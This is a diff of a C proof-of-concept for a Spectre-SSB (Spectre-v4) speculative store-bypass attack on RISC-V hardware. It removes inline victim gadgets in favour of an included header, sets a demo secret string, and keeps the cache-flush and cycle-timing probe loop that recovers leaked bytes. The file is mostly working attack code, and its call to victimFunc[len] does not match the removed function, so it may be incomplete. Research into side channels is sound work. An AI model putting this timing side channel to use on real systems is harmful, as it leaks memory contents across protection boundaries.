@@ -1,7 +1,5 @@
 #include "../lib.c"
 
-// No printf in RSD so all unnecessary printfs have been commented out.
-
 #include <stdio.h>
 #include <stdint.h>
 //#include <string.h> // For strlen()
@@ -10,7 +8,9 @@
 #include "util_riscv.h"
 #include "util_shared.h"
 #include "cache.h"
+#include "gadget.h"
 
+// Remind: Spectre SSB  will only succeed on machines with MDP (Memory Dependence Prediction) and speculative STL forwarding.
 
 /* >>>>>> Mostly used parameters for debugging are listed below. >>>>>> */
 /*
@@ -31,10 +31,8 @@
 
 /* <<<<<< Mostly used parameters for debugging are listed above. <<<<<< */
 
-
-//#define DEFAULT_STRING "#Secret_Information!"
-//#define DEFAULT_STRING "#Secret!"
-#define DEFAULT_STRING "q534502"
+#define SECRET_STRING "RISCV"
+#define SECRET_LENGTH 5
 //#define MAX_STRING_LENGTH_FACTOR 8
 /**
  * Arbitrary as long as your machine allows it
@@ -88,131 +86,7 @@
  */
 
 uint8_t guideArray[ARRAY_SIZE_FACTOR];
-//char* guideArray[ARRAY_SIZE_FACTOR];
-// Data type follows "delayer" and "memoryDestination".
-// TBD: optimize its array size to fit the later input "secretString".
 uint8_t probeArray[ARRAY_SIZE_FACTOR * ARRAY_STRIDE];
-
-/* Declare a global variable that prevents the compiler from optimizing out victimFunc() . */
-uint8_t anchorVar = 0;
-uint8_t shift_base = 2;
-
-uint32_t tempStringIndex = 1;
-uint32_t tempString[ARRAY_SIZE_FACTOR];
-
-//char** delayer[ARRAY_SIZE_FACTOR];
-// Its size shall be set to that of the guideArray.
-//char knownString[ARRAY_SIZE_FACTOR];
-// TBD: investigate relations between its values and guessed results. 
-
-/**
- * @input idx input to be used to idx the array
- */
-
-void victimFuncInit(uint32_t targetIdx)
-{
-/* Use a different index of tempString to avoid effect of initial insctruction cache miss.
- * Basically the form is kept the same as succeeding formal victimFunc since it is expected to simulate real scene
- * where attacker has no access to valid address like targetIdx.
- */
-
-	tempString[0] = targetIdx;
-        tempStringIndex = tempStringIndex << 4;
-        asm("fcvt.s.wu  fa4, %[in]\n"
-                "fcvt.s.wu      fa5, %[inout]\n"
-                "fdiv.s fa5, fa5, fa4\n"
-                "fdiv.s fa5, fa5, fa4\n"
-                "fdiv.s fa5, fa5, fa4\n"
-                "fdiv.s fa5, fa5, fa4\n"
-                "fcvt.wu.s      %[out], fa5, rtz\n"
-                : [out] "=r" (tempStringIndex)
-                : [inout] "r" (tempStringIndex), [in] "r" (shift_base)
-                : "fa4", "fa5");
-
-        tempString[tempStringIndex] = 0;
-	anchorVar &= probeArray[guideArray[tempString[0]] * ARRAY_STRIDE];
-}
-
-void victimFunc(uint32_t targetIdx){
-// Spectre SSB  will only succeed on machines with MDP (Memory Dependence Prediction) and speculative STL forwarding.
-
-	tempString[1] = targetIdx;
-
-	tempStringIndex = tempStringIndex << 4;
-	asm("fcvt.s.wu	fa4, %[in]\n"
-		"fcvt.s.wu	fa5, %[inout]\n"
-		"fdiv.s	fa5, fa5, fa4\n"
-		"fdiv.s	fa5, fa5, fa4\n"
-		"fdiv.s	fa5, fa5, fa4\n"
-		"fdiv.s	fa5, fa5, fa4\n"
-		// Adjust tempStringIndex value and increase fdiv rows to improve accuracy.
-//		"fdiv.s	fa5, fa5, fa4\n"
-//		"fdiv.s	fa5, fa5, fa4\n"
-//		"fdiv.s	fa5, fa5, fa4\n"
-//		"fdiv.s	fa5, fa5, fa4\n"
-		"fcvt.wu.s	%[out], fa5, rtz\n"
-		: [out] "=r" (tempStringIndex)
-		: [inout] "r" (tempStringIndex), [in] "r" (shift_base)
-		: "fa4", "fa5");
-
-	tempString[tempStringIndex] = 0;
-	// "Quickly" load that value from that memory location.
-	anchorVar &= probeArray[guideArray[tempString[1]] * ARRAY_STRIDE];//tempString[idx]
-}
-
-void victimFuncOdd(uint32_t targetIdx){
-// Spectre SSB  will only succeed on machines with MDP (Memory Dependence Prediction) and speculative STL forwarding.
-
-	tempString[1] = targetIdx;
-
-	// Use fdiv ops to stall and delibrately "slowly" store a value at a memory location.
-	tempStringIndex = tempStringIndex << 4;
-	asm("fcvt.s.wu	fa4, %[in]\n"
-		"fcvt.s.wu	fa5, %[inout]\n"
-		"fdiv.s	fa5, fa5, fa4\n"
-		"fdiv.s	fa5, fa5, fa4\n"
-		"fdiv.s	fa5, fa5, fa4\n"
-		"fdiv.s	fa5, fa5, fa4\n"
-		// Adjust tempStringIndex value and increase fdiv these rows to improve accuracy.
-//		"fdiv.s	fa5, fa5, fa4\n"
-//		"fdiv.s	fa5, fa5, fa4\n"
-//		"fdiv.s	fa5, fa5, fa4\n"
-//		"fdiv.s	fa5, fa5, fa4\n"
-		"fcvt.wu.s	%[out], fa5, rtz\n"
-		: [out] "=r" (tempStringIndex)
-		: [inout] "r" (tempStringIndex), [in] "r" (shift_base)
-		: "fa4", "fa5");
-
-	tempString[tempStringIndex] = 0;
-	// "Quickly" load that value from that memory location.
-	anchorVar &= probeArray[guideArray[tempString[1]] * ARRAY_STRIDE];
-}
-
-void victimFuncEven(uint32_t targetIdx){
-// Spectre SSB  will only succeed on machines with MDP (Memory Dependence Prediction) and speculative STL forwarding.
-
-	tempString[1] = targetIdx;
-	tempStringIndex = tempStringIndex << 4;
-	asm("fcvt.s.wu	fa4, %[in]\n"
-		"fcvt.s.wu	fa5, %[inout]\n"
-		"fdiv.s	fa5, fa5, fa4\n"
-		"fdiv.s	fa5, fa5, fa4\n"
-		"fdiv.s	fa5, fa5, fa4\n"
-		"fdiv.s	fa5, fa5, fa4\n"
-		// Adjust tempStringIndex value and increase fdiv rows to improve accuracy.
-//		"fdiv.s	fa5, fa5, fa4\n"
-//		"fdiv.s	fa5, fa5, fa4\n"
-//		"fdiv.s	fa5, fa5, fa4\n"
-//		"fdiv.s	fa5, fa5, fa4\n"
-		"fcvt.wu.s	%[out], fa5, rtz\n"
-		: [out] "=r" (tempStringIndex)
-		: [inout] "r" (tempStringIndex), [in] "r" (shift_base)
-		: "fa4", "fa5");
-
-	tempString[tempStringIndex] = 0;
-
-	anchorVar &= probeArray[guideArray[tempString[1]] * ARRAY_STRIDE];
-}
 
 // TBD: mix the order in other ways.
 #define MIXER_A 65 // min 65. 163, 167, 127, 111. Must be larger than 64.
@@ -220,26 +94,7 @@ void victimFuncEven(uint32_t targetIdx){
 
 int main(void){
 
-//	printf("****** Transient Execution Attack Demonstration ******\n");
-//	printf("- Type of Attack: Spectre-SSB (a.k.a Spectre-v4)\n");
-//	printf("- Target Chipset: RISC-V TH1520 SoC (Quad T-Head XuanTie C910)\n");
-
-	char* defaultString = DEFAULT_STRING;
-	//int maxStringLength = strlen(defaultString) * MAX_STRING_LENGTH_FACTOR;
-	// Fixed because there is no printf in RSD.
-	char* secretString = DEFAULT_STRING;
-	// Can not use strlen(secretString) so use this instead
-	uint32_t secretStringLength = 8; // Used to be 12, 32. Save time.
-
-    	// Allocate memory for the string.
-	// Need to do this in main function because return 1 of subfunction will not terminate the main.
-	//secretString = malloc(maxStringLength * sizeof(char));
-	//if (secretString == NULL) {
-	//	printf("Error: Memory allocation failed.\n");
-	//	return 1; // Indicate error
-	//}
-
-	//dynamicInputString(defaultString, maxStringLength, secretString);
+	char* secretString = SECRET_STRING;
 
 	uint32_t attackIdx = (uint32_t)(secretString - (char*)guideArray);
 	uint32_t mixed_i;
@@ -253,25 +108,11 @@ int main(void){
 	uint8_t output[2];
 	uint32_t hitArray[2];
 
-	//char guessString[strlen(secretString)+1];
-//	char guessString[secretStringLength+1];
-//	/* Fill the guessString with NULL terminators. */
-//	for (int i = 0; i < sizeof(guessString); i++){
-//		guessString[i] = '\0';
-//	}
+    for (int i = 0; i < sizeof(guideArray); i++){
+        guideArray[i] = 1;
+    }
 
-	/* Fill the knownString with NULL terminators. */
-//	for (int i = 0; i < ARRAY_SIZE_FACTOR; i++){
-//		knownString[i] = '\0';
-//	}
-
-	//srand(time(NULL));
-
-        for (int i = 0; i < sizeof(guideArray); i++){
-                guideArray[i] = 1;
-        }
-
-	/* Write to probeArray so in RAM not copy-on-write zero pages. */
+	// Write to probeArray so in RAM not copy-on-write zero pages.
 	for (int i = 0; i < sizeof(probeArray); i++){
 		probeArray[i] = 1;
 	}
@@ -291,61 +132,34 @@ int main(void){
     *outputAddr = '=';
     *outputAddr = '\n';
 
-//	printf("------ Start of Attack ------\n");
-//	printf("MemAddr ~ StrOffset ~ TargetChar <-?-- GuessResult(Char, Dec, Hits)\n"); 
-
-	// Note: strlen() calculates the length of a string up to, but not including, the terminating null \n character.
-	// About strlen() function: https://en.cppreference.com/w/cpp/string/byte/strlen
-	// Note: sizeof() does not care about the value of a string, so can not be used here.
-	// Ref: https://www.geeksforgeeks.org/difference-strlen-sizeof-string-c-reviewed/
-	//for(uint32_t len = 0; len < (strlen(secretString)); len++){
-	for(uint32_t len = 0; len < (secretStringLength); len++){
-
+	for(uint32_t len = 0; len < (SECRET_LENGTH); len++){
+	
 		// Clear results every round.
 		for(uint32_t cIdx = 0; cIdx < RESULT_ARRAY_SIZE; cIdx++){
 			results[cIdx] = 0;
 		}
 
-//		victimFuncPre(attackIdx);
-
 		// Run the attack on the same idx for ATTACK_ROUNDS times.
 		for(uint32_t atkRound = 0; atkRound < ATTACK_ROUNDS; atkRound++){
 
-//			*delayer = guideArray;
-//			*guideArray = secretString;
-
 			// Make sure array you read from is not in the cache.
-//			flushCache((uint32_t)delayer, sizeof(delayer));
 //			flushCache(tempStringIndex, sizeof(tempStringIndex));
 			flushCache((uint32_t)probeArray, sizeof(probeArray));
 
 			victimFuncInit(attackIdx);
-			victimFunc(attackIdx);
-
-/*			if (atkRound % 2 != 0)
-			{
-				victimFuncInit(attackIdx);
-				victimFuncOdd(attackIdx);
-			}
-			else
-			{
-				victimFuncInit(attackIdx);
-				victimFuncEven(attackIdx);
-			}*/
+			//victimFunc(attackIdx);
+			victimFunc[len](attackIdx);
 
 			// Read out probeArray and see the hit secret value.
 			/* Time reads. Order is slightly mixed up to prevent stride prediction (prefetching). */
 			for (int i = 0; i < ARRAY_SIZE_FACTOR; i++) {
 				mixed_i = ((i * MIXER_A) + MIXER_B) & (ARRAY_SIZE_FACTOR-1);
-//                                mixed_i = i;
 				start = READ_CSR(mcycle);
 				//There should be nothing between these 2 rows, otherwise you need to adjust the threshold. 
 				dummy &= probeArray[mixed_i * ARRAY_STRIDE];
 				diff = (READ_CSR(mcycle) - start);
 
-
-				// Condition: interval of time is smaller than the threshold, AND the character is not a legal addreess value predefined.			
-//				if ((uint32_t)diff < CACHE_HIT_THRESHOLD && mixed_i != knownString[len]){
+				// Condition: interval of time is smaller than the threshold.
 				if ((uint32_t)diff < CACHE_HIT_THRESHOLD){
 					results[mixed_i]++; /* Cache hit */
 				}
@@ -360,15 +174,15 @@ int main(void){
 
 //	char x = (char)output[0]+'0';
 
-	*outputAddr = 'V';
-        *outputAddr = 'a';
-        *outputAddr = 'l';
-        *outputAddr = 'u';
-        *outputAddr = 'e';
-        *outputAddr = ':';
-        *outputAddr = ' ';
-        *outputAddr = (char)output[0];// + '0';//
-//	*outputAddr = x;//output[0];
+		*outputAddr = 'V';
+    	*outputAddr = 'a';
+    	*outputAddr = 'l';
+    	*outputAddr = 'u';
+    	*outputAddr = 'e';
+    	*outputAddr = ':';
+    	*outputAddr = ' ';
+    	*outputAddr = (char)output[0];// + '0';//
+	//	*outputAddr = x;//output[0];
         *outputAddr = ' ';
         *outputAddr = 'H';
         *outputAddr = 'i';
@@ -378,9 +192,8 @@ int main(void){
         *outputAddr = (char)hitArray[0] + '0';
         *outputAddr = '\n';
 
-//		guessString[len]=(char)output[0];
-	attackIdx++;
-//	tempStringIndex++;
+		attackIdx++;
+
 	}
 
     *outputAddr = '=';
@@ -393,17 +206,6 @@ int main(void){
     *outputAddr = '=';
     *outputAddr = '=';
     *outputAddr = '\n';
-
-	//printf("------ End of Attack ------\n");
-	
-	//printf("------ Summary ------\n");
-    //printf("Expected: "ANSI_CODE_YELLOW"%s"ANSI_CODE_RESET"\n", secretString);
-	//printf("Guessed: "ANSI_CODE_CYAN"%s"ANSI_CODE_RESET"\n", guessString);
-	//printf("****** That Is All for the Demonstration ******\n");
-	
-    // Since the size of the secret string is not dynamic anymore, the mem does not need to be freed.
-	// Free the allocated memory after use.
-	//free(secretString);
 
 	return 0;
 }
